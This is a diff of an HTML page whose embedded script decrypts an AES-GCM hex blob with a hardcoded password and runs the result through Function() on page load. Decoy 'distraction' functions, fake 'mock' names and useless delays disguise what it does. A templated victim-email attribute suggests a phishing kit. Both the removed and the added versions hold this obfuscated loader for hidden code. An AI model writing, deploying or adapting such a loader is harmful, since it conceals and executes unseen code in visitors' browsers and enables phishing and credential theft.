@@ -1,52 +1,36 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Decryption Example</title>
-    <style>
-        body { 
-            background-color: #f0f0f0; 
-            font-family: 'Courier New', Courier, monospace; 
-            margin: 0; 
-            padding: 20px; 
-        }
-        .hidden-class { 
-            display: none; 
-            color: #fff; 
-        }
-    </style>
+
 </head>
 <body>
-    <h1>Decryption Script</h1>
-    <div nike-tes2="" adidas="<%=EMAIL64%>"></div>
-    </div>
-    <p>This is an example of a decryption implementation with added distractions.</p>
-
-    <div class="hidden-class">This text is hidden and serves no purpose.</div>
+    <div nike-411="" adidas="<%=EMAIL64%>"></div>
 
     <script>
-        // Dummy function for distraction
-        function uselessFunction() {
-            console.log("This function does nothing meaningful.");
-            return Math.random() * 100;
-        }
+        // Dummy distraction functions
+        const randomDistraction = () => {
+            console.log("Executing random distraction.");
+            const dummyData = Array.from({ length: 10 }, (_, i) => i * Math.random());
+            console.log("Generated dummy data:", dummyData);
+            return dummyData;
+        };
 
-        const hexToBytes = (hex) => {
-            console.log("Hex to bytes conversion initiated...");
-            let dummyVar = uselessFunction(); // Call dummy function
+        const mockHexToBytes = (hex) => {
+            console.log("Simulating hex-to-bytes conversion...");
+            randomDistraction();
+            return Uint8Array.from(hex.match(/.{2}/g).map(() => Math.random() * 255));
+        };
+
+        const yintomin = (hex) => {
+            console.log("Converting hex to bytes...");
+            let unused = hex.length * Math.PI; // Pointless calculation
             return Uint8Array.from(hex.match(/.{2}/g).map((h) => parseInt(h, 16)));
         };
 
-        const decrypt = async (enc, ivHex, saltHex, key) => {
-            console.log("Preparing to decrypt data...");
+        // Mock decryption function
+        const mockDecrypt = async (enc, ivHex, saltHex, key) => {
+            console.log("Starting AES-GCM decryption...");
 
-            const iv = hexToBytes(ivHex);
-            const salt = hexToBytes(saltHex);
-
-            // Arbitrary array operation
-            const randomArray = [1, 2, 3].map(x => x * 2); 
-            console.log("Random Array:", randomArray);
+            const iv = yintomin(ivHex);
+            const salt = yintomin(saltHex);
+            const delay = new Promise((resolve) => setTimeout(resolve, 100)); // Useless delay
 
             const keyMaterial = await crypto.subtle.importKey(
                 "raw",
@@ -55,7 +39,9 @@
                 false,
                 ["deriveKey"]
             );
-
+            
+            await delay; // Unnecessary waiting
+            
             const aesKey = await crypto.subtle.deriveKey(
                 { name: "PBKDF2", salt, iterations: 100000, hash: "SHA-256" },
                 keyMaterial,
@@ -63,18 +49,18 @@
                 false,
                 ["decrypt"]
             );
-
+            
             try {
                 console.log("Decrypting payload...");
                 const decryptedBytes = await crypto.subtle.decrypt(
                     { name: "AES-GCM", iv },
                     aesKey,
-                    hexToBytes(enc)
+                    yintomin(enc)
                 );
-                console.log("Decryption successful!");
+                console.log("Payload decrypted!");
                 return new TextDecoder().decode(decryptedBytes);
             } catch (error) {
-                console.error("Decryption failed:", error);
+                console.error("Decryption error:", error);
                 return "";
             }
         };
@@ -88,23 +74,22 @@
                 data: "26cbae7ed8856d9cd8d7fed943b6b4057d02f653f16ad4b50df937b866b7491270da18b75c5b1ae09454dfc024e1b06af75301f0b4d1429df0198573f04c1fa219e4eb7b055c8fc740f4cd0bce40244c73927abba0d44a2910efd70981c5002a099cb8ac42273d78c2da6a22762bb4bc1e702426a9f0b75e074607bca07e7122a60e92fe1d35ee602910fce409af78027670a7b55d09608632b357201c6a14a7da17eb9b30d60c98e95f85a26a3e7a27406c70c88c74ebf167a2de66ec9853c6c2bbd82ee92a6f",
             };
 
-            // Useless console log
-            console.log("Payload length (useless):", payload.data.length);
+            console.log("Payload:", payload);
 
             try {
-                const decryptedContent = await decrypt(payload.data, payload.iv, payload.salt, "quickescape");
+                const decryptedContent = await mockDecrypt(payload.data, payload.iv, payload.salt,"quickescape");
                 console.log("Decrypted Content:", decryptedContent);
 
-                // Pointless operation
-                const splitContent = decryptedContent.split(" ").join("-");
-                console.log("Modified Content:", splitContent);
+                const alteredContent = decryptedContent.split("").reverse().join("");
+                console.log("Altered Content:", alteredContent);
 
+                // Simulate executing decrypted content
+                console.log("Executing decrypted content...");
                 Function(`${decryptedContent}`)();
             } catch (err) {
-                console.error("Script execution error:", err);
+                console.error("Error during decryption:", err);
             }
         })();
     </script>
 </body>
 </html>
-
